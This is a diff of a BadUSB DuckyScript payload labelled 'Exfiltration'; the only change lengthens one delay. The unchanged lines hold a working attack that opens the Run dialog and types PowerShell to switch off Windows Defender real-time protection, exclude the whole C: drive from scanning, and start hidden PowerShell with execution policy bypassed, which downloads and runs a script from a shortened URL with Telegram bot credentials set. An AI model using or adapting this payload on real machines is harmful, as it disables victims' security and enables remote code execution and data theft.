@@ -7,7 +7,7 @@ REM Version:	1.0
 REM Category:	Exfiltration
 REM Source: https://github.com/Mr-Proxy-source/BadUSB-Payloads
 
-DELAY 1000
+DELAY 1500
 GUI r
 DELAY 500
 STRING powershell.exe -Command "Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath 'C:\'; Start-Sleep -Seconds 5; powershell -w h -NoP -Ep Bypass -Command '$bt='bot-token'; $ci='chat-id'; irm https://t.ly/-qlYd | iex'"
